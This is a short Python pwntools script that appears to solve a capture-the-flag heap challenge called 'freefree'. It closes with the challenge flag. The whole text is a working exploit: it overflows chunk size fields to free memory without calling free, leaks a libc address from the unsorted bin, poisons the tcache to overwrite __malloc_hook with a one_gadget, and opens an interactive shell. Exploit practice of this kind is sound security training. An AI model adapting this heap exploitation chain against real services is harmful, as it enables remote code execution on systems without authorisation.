#!/bin/python3
from pwn import *

context.binary='freefree'

s=remote('127.0.0.1',40006)

def malloc(var, size):
	s.sendlineafter('> ','%s=malloc(%s)'%(var,size))
	
def gets(var,data):
	s.sendlineafter('> ','gets(%s)'%var)
	s.sendline(data)

def puts(var):
	s.sendlineafter('> ','puts(%s)'%var)
	return s.recvline()[:-1]
	
def exit():
	s.sendlineafter('> ','exit(0)')
	
malloc('A',0x10)
gets('A',b'a'*0x18+pack(0xd51))
malloc('B',0xd30)
malloc('C',0xd20)

unsort=unpack(puts('C').ljust(8,b'\0'))
libc_base=unsort-(0x1ebb80+0x60)
print("libc_base:",hex(libc_base))

gets('B',b'b'*0xd38+pack(0x2c1))
malloc('D',0xd30)
gets('D',b'd'*0xd38+pack(0x2c1))
malloc('E',0x2a0)

libc=ELF('./libc-2.31.so')
libc.address=libc_base
gets('D',b'd'*0xd38+pack(0x2a1)+pack(libc.symbols.__malloc_hook))

malloc('F',0x290)
malloc('G',0x290)

one_gadget=libc_base+0xe6aee
gets('G',pack(one_gadget))

malloc('A',0x10)

s.interactive()

	
#MOCSCTF{Fr33_@nd_Fr33_1s_n07_3@5y}
